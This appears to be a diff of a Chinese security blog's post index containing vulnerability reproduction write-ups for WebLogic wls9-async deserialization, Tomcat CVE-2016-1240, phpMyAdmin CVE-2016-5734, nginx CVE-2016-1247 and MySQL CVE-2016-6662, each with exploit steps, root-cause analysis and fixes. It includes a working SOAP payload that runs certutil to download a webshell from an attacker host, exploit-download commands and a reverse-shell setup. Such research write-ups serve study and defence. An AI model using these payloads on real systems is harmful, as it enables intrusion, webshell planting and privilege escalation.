-    <url>/archives/94f70d04.html</url>
-    <content><![CDATA[<p>针对Weblogic wls9-async反序列化进行漏洞环境搭建及复现。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
-<!--more  -->
-
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>服务器需要安装jdk,这里采用1.7版本。</p>
-<p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9taWRkbGV3YXJlL3dlYmxvZ2ljL2Rvd25sb2Fkcy93bHMtbWFpbi0wOTcxMjcuaHRtbA==">Oracle官网<i class="fa fa-external-link-alt"></i></span>下载对应版本,这里使用的12.1.3(10.x版本也可以的)。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10e75259ba.png"><img data-src="https://i.loli.net/2019/04/25/5cc10e75259ba.png" alt="oracle-download.png"></a></p>
-<p>下载完成之后，通过<code>java -jar fmw_12.1.3.0.0_wls.jar</code>启动安装程序，默认安装即可。安装完成之后启动weblogic。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10f794723e.png"><img data-src="https://i.loli.net/2019/04/25/5cc10f794723e.png" alt="weblogic-start.png"></a></p>
-<p>通过浏览器访问查看服务是否启动。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10fb8dade5.png"><img data-src="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" alt="weblogic-bro.png"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在攻击机上通过python启动一个web服务，该目录下放一个webshell。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span> <span class="comment"># python2</span></span><br><span class="line">python3 -m http.server <span class="comment"># python3</span></span><br></pre></td></tr></table></figure>
-
-<p>由于是soap，先访问一下<span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvX2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlP1dTREw=">http://ip:port/_async/AsyncResponseService?WSDL<i class="fa fa-external-link-alt"></i></span> ，看下格式结构。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc1105a91737.png"><img data-src="https://i.loli.net/2019/04/25/5cc1105a91737.png" alt="weblogic-wsdl.png"></a></p>
-<p>通过SOAP-UI进行请求构建，新建一个soap，在Initial WSDL输入刚刚的url。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc110c956692.png"><img data-src="https://i.loli.net/2019/04/25/5cc110c956692.png" alt="weblogic-soap.png"></a></p>
-<p>新建一个request请求。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc111862585f.png"><img data-src="https://i.loli.net/2019/04/25/5cc111862585f.png" alt="new-requests.png"></a></p>
-<p>将下列代码贴进请求包中，需要注意的是string标签下面的ip、port、webshell.txt这些需要按照自己的环境进行修改。我的攻击机ip为192.168.100.5 port为80 webshell.txt为cmd.txt。</p>
-<p>上传的路径：</p>
-<p>12版本<code>servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/</code></p>
-<p>10版本<code>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</code>。</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>certutil -urlcache -split -f http://192.168.100.5/cmd.txt servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/cmd.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>点击request窗口的发送请求按钮，可以看到攻击机上的python web服务有访问请求，说明文件已经成功上传到服务器上。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc11477bda21.png"><img data-src="https://i.loli.net/2019/04/25/5cc11477bda21.png" alt="python-httpserver.png"></a></p>
-<p>通过蚁剑或菜刀连接即可。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
-<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用JD-GUI打开对应War包。</p>
-<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Weblogic9:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/weblogic92/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic <span class="number">10</span>:</span><br><span class="line">/%WLS_HOME%<span class="regexp">/wlserver_10.3/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line"><span class="symbol">Weblogic12:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/oracle_common/modules</span><span class="regexp">/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure>
-
-<p>在web.xml里面可以看到基本都是指向<code>weblogic.wsee.async.AsyncResponseBean</code></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc18b223d1a4.png" alt="web-xml.png"></p>
-<p>跟进<code>weblogic.wsee.async.AsyncResponseBean</code>，可以得知有两个函数handleResult、handleFault。查看<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vbWlkZGxld2FyZS8xMjIxMy93bHMvV0xBUEkvd2VibG9naWMvd3NlZS9hc3luYy9Bc3luY1Jlc3BvbnNlQmVhbi5odG1s">oracle官方<i class="fa fa-external-link-alt"></i></span>对AsyncResponseBean类的描述，查看Method Detail,可以得知handleResult是当异步响应服务收到对请求正常时调用，handleFault是异常时调用。</p>
-<p>根据官方文档可以得知AsyncResponseBean继承AbstractAsyncResponseBean类(<code>%WLS_HOME%/server/lib/weblogic.jar</code>)。在weblogic.wsee.async找到该类。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a3cf32429.png" alt="weblogic-abstractasync.png"></p>
-<p>由于不了解weblogic逻辑处理流程，根据查阅的资料所得：该处会与AddressingHandler、AsyncResponseHandler、WorkAreaHandler有关。</p>
-<p>其中WorkAreaHandler被WorkAreaServerHandler和WorkAreaClientHandler继承，而WorkAreaServerHandler的27行处<code>localWorkContextMapInterceptor.receiveRequest(**new** WorkContextXmlInputAdapter(localWorkAreaHeader.getInputStream()));</code>可以看到接受请求用到了WorkContextXmlInputAdapter。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a9a55c1b0.png" alt="requests.png"></p>
-<p>跟进该类可以发现该类imoprt了XMLDecoder，而且并没有做过滤。XMLDecoder是用来将XML文件反序列化成java对象。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a96f84381.png" alt="XMLDecoder.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1.删除对应war包；</p>
-<p>2.禁用bea_wls9_async_response组件。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析还有存在疑难点：weblogic整体的逻辑处理流程是如何，这个需要后续是多了解。</p>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BurpSuite抓取非HTTP协议流量</title>
     <url>/archives/ffc80a19.html</url>
     <content><![CDATA[<p>在进行APP渗透的时候，设置代理到BurpSuite的时候，发现没拦截到包，但是已经获取到数据。猜测是请求包走的是非HTTP协议，发现BurpSuite有一个插件可以抓取TCP的流量：NoPE Proxy。<br><img data-src="https://i.loli.net/2018/11/29/5bff79c9eb463.png" title="NoPE界面"></p>
@@ -1712,6 +1506,212 @@
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-1240分析</title>
+    <url>/archives/29004be5.html</url>
+    <content><![CDATA[<p>针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。<br><a href="https://i.loli.net/2018/05/27/5b0ab46ce5759.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab46ce5759.png" alt="success.png"></a></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>获取<span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9Ub21jYXQtRGViUGtncy1Sb290LVByaXZpbGVnZS1Fc2NhbGF0aW9uLUV4cGxvaXQtQ1ZFLTIwMTYtMTI0MC5odG1s">POC脚本<i class="fa fa-external-link-alt"></i></span>，运行POC脚本。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/tomcat-rootprivesc-deb.sh /</span>var<span class="regexp">/log/</span>tomcat7/catalina.out</span><br></pre></td></tr></table></figure>
+<p><a href="https://i.loli.net/2018/05/27/5b0ab574c2c89.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab574c2c89.png" alt="run poc.png"></a><br>运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png" alt="run end.png"></a><br>重启Tomcat服务。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">serverce</span> tomcat<span class="number">7</span> restart</span><br></pre></td></tr></table></figure>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>POC脚本85行判断用户是否为tomcat用户。<br><a href="https://i.loli.net/2018/05/27/5b0ab64865e90.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab64865e90.png" alt="1.png"></a><br>93行判断指定的tomcat日志文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656db9dd.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656db9dd.png" alt="2.png"></a><br>158行删除日志文件并软链接到/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab656de8a8.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656de8a8.png" alt="3.png"></a><br>168行判断/etc/ld.so.preload文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dff2c.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656dff2c.png" alt="4.png"></a><br>188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e13df.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656e13df.png" alt="5.png"></a><br>199行删除/etc/ld.so.preload和/tmp/privesclib.so。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e2b76.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656e2b76.png" alt="6.png"></a><br>跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png" alt="7.png"></a></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Tomcat。</p>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-5734分析</title>
+    <url>/archives/94f683da.html</url>
+    <content><![CDATA[<p>针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bad646bb23.png" alt="html.png"></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDAxODUv">下载<i class="fa fa-external-link-alt"></i></span>POC并执行即可。<br><img data-src="https://i.loli.net/2018/05/28/5b0bac6432b3e.png" alt="success.png"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。<br>跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42577df.png" alt="1.png"><br>在661行getReplacePreview函数调用了getRegexReplaceRows。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426791f.png" alt="2.png"><br>在613行findAction函数调用了getReplacePreview。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4266236.png" alt="3.png"><br>在175行indexAction函数调用了findAction，当searchType为replace调用findAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4264c4b.png" alt="4.png"><br>在/tbl_find_replace.php第33行调用indexAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42622fe.png" alt="5.png"><br>根据以上可得知，调用getRegexReplaceRows函数的流程为：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">/tbl_find_replace.ph →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php indexAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php findAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php getReplacePreview() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php _getRegexReplaceRows()</span><br></pre></td></tr></table></figure>
+<p>当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426366e.png" alt="6.png"><br>在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4260f61.png" alt="7.png"><br>回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf425f9e6.png" alt="8.png"><br>当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。</p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级phpMyAdmin。</p>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-1247分析</title>
+    <url>/archives/eca7756b.html</url>
+    <content><![CDATA[<p>针对CVE-2016-1247漏洞进行复现、研究分析原理。<br><img data-src="https://i.loli.net/2018/05/27/5b0a99128c972.png" alt="success.png"></p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。</p>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a99a92f715.png" alt="id.png"><br>查看Nginx版本<code>dpkg -l | grep -i nginx</code><br><img data-src="https://i.loli.net/2018/05/27/5b0a99c78ea14.png" alt="nginx version.png"><br>下载poc脚本</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>legalhackers.com<span class="regexp">/exploits/</span>CVE-<span class="number">2016</span>-<span class="number">1247</span>/nginxed-root.sh</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/05/27/5b0a9b092c3ec.png" alt="wget.png"><br>修改poc权限,并执行poc</p>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 nginxed-root.<span class="keyword">sh</span></span><br><span class="line">./nginxed-root.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/02/01/5a72bfed2d1c2.png" alt="run.png"><br>查看现在用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a9bb689f58.png" alt="final id.png"></p>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行<br><img data-src="https://i.loli.net/2018/02/01/5a72c0782bbd3.png" alt="www-data.png"><br>查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的<br><img data-src="https://i.loli.net/2018/02/01/5a72c08966ad5.png" alt="root.png"><br>根据POC进行利用分析，在145行使用dlsym获取euid<br>在147、148行修改/tmp/nginxrootsh文件的所有者和权限<br>在149行删除/etc/ld.so.preload文件<br><img data-src="https://i.loli.net/2018/02/01/5a72c0a10d21f.png" alt="code.png"><br>在154行编译生成的c文件，在其后判断是否编译成功<br><img data-src="https://i.loli.net/2018/02/01/5a72c0b003134.png" alt="make.png"><br>在162行将/bin/bash拷贝到/tmp/nginxrootsh<br><img data-src="https://i.loli.net/2018/02/01/5a72c0c48ba68.png" alt="copy.png"><br>在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0d7d17c2.png" alt="delete.png"><br>在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0f12d27a.png" alt="copy.png"><br>在199行将/etc/ld.so.preload权限设置为755<br><img data-src="https://i.loli.net/2018/02/01/5a72c0ff840bc.png" alt="chmod.png"></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。<br><img data-src="https://i.loli.net/2018/05/27/5b0a9c0b508d9.png" alt="root command.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Nginx版本。</p>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-6662分析</title>
+    <url>/archives/438a17c4.html</url>
+    <content><![CDATA[<p>针对MySQL Code Execution  Privilege Escalation进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf1a7cd28e.png" alt="success.png"></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载<span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9NeVNRTC1FeHBsb2l0LVJlbW90ZS1Sb290LUNvZGUtRXhlY3V0aW9uLVByaXZlc2MtQ1ZFLTIwMTYtNjY2Mi5odG1s">cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c<i class="fa fa-external-link-alt"></i></span>，并放同一目录下（.so文件运行py时会自动生成）。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3652a5b4.png" alt="download.png"><br>修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf382985e0.png" alt="1.png"><br>运行py脚本。</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> cve-<span class="number">2016</span>-<span class="number">6662</span>_MySQL_RCE_exploit.<span class="keyword">py</span> -dbuser root -dbpass <span class="string">&#x27;&#x27;</span> -dbname pocdb -dbhost <span class="number">127.0</span>.<span class="number">0.1</span> -mycnf /etc/mysql/my.<span class="keyword">cnf</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/05/28/5b0bf3cae23f8.png" alt="2.png"><br>这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"><br>重启mysql服务，成功反弹shell。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。<br>跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6414a9a3.png" alt="safe mysql.png"><br>在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf65a91e1e.png" alt="my.cnf.png"><br>使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf69061dbd.png" alt="ps aux.png"><br>在my.cnf中写入malloc_lib加载so文件的路径。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6c216109.png" alt="malloc.png"><br>使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6de6ed35.png" alt="gcc.png"><br>配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。</p>
+<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><ol>
+<li>/etc/mysql/my.cnf权限设置：<img data-src="https://i.loli.net/2018/05/28/5b0bf47b43ac4.png" alt="1-1.png"><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chown mysql:root <span class="regexp">/etc/my</span>sql/my.cnf</span><br><span class="line">chmod <span class="number">600</span> <span class="regexp">/etc/my</span>sql/my.cnf</span><br></pre></td></tr></table></figure></li>
+<li>攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。<img data-src="https://i.loli.net/2018/05/28/5b0bf580c08c5.png" alt="2-2.png"><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p；</span><br><span class="line"><span class="keyword">use</span> pocdb;（攻击database的数据库名字）</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> poctable;</span><br></pre></td></tr></table></figure></li>
+<li>py脚本会自动运行nc，因此攻击服务器需要安装nc。</li>
+<li>如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。<img data-src="https://i.loli.net/2018/05/28/5b0bf5dd46899.png" alt="3-3.png"><img data-src="https://i.loli.net/2018/05/28/5b0bf604c841e.png" alt="4-4.png"><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-dbport&#x27;</span>, <span class="attribute">dest</span>=<span class="string">&#x27;TARGET_PORT&#x27;</span>, <span class="attribute">required</span>=<span class="literal">True</span>, <span class="attribute">help</span>=<span class="string">&#x27;MySQL port&#x27;</span>) # 74行</span><br><span class="line">dbconn = mysql.connector.connect(<span class="attribute">user</span>=args.TARGET_USER, password =args.TARGET_PASS, <span class="attribute">database</span>=args.TARGET_DB, <span class="attribute">host</span>=args.TARGET_HOST, <span class="attribute">port</span>=args.TARGET_PORT) # 83行</span><br></pre></td></tr></table></figure>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1>升级MySQL。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-6663分析</title>
